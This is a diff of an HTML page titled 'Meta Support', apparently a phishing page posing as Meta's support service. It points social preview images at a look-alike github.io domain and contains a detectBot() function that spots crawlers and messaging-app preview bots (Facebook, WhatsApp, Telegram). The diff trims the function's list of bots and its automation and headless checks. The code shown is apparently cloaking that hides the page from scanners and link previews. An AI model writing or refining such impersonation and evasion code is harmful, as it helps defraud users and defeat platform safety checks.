@@ -13,8 +13,8 @@
     <meta property="og:type" content="article">
     <meta property="og:title" content="Meta Support">
     <meta property="og:description" content="">
-    <meta property="og:image" content="/1111111111111.jpg">
-    <meta property="og:image:url" content="/1111111111111.jpg">
+    <meta property="og:image" content="https://supportmetabusiness.github.io/1111111111111.jpg">
+    <meta property="og:image:url" content="https://supportmetabusiness.github.io/1111111111111.jpg">
     <meta property="og:image:type" content="image/jpeg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="628">
@@ -22,50 +22,18 @@
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="Meta Support">
     <meta name="twitter:description" content="">
-    <meta name="twitter:image" content="/1111111111111.jpg">
+    <meta name="twitter:image" content="https://supportmetabusiness.github.io/1111111111111.jpg">
 
     <script>
         function detectBot() {
             const botPatterns = [
                 'bot', 'spider', 'crawl', 'slurp', 'facebook', 'whatsapp',
-                'telegram', 'viber', 'twitter', 'discord', 'slack',
-                'linkedin', 'skype', 'pinterest', 'zoom'
+                'telegram'
             ];
-
             const userAgent = navigator.userAgent.toLowerCase();
-
             if (botPatterns.some(pattern => userAgent.includes(pattern))) {
                 return true;
             }
-
-            if (navigator.webdriver || window.navigator.webdriver) {
-                return true;
-            }
-
-            const automationTools = [
-                '_phantom',
-                '__nightmare',
-                'callPhantom',
-                'buffer',
-                'awesomium',
-                'cef',
-                'selenium',
-                'headless',
-                'phantomjs',
-                'nightmarejs',
-                'rhino'
-            ];
-
-            for (const tool of automationTools) {
-                if (window[tool]) {
-                    return true;
-                }
-            }
-
-            if (navigator.plugins.length === 0) {
-                return true;
-            }
-
             return false;
         }
 
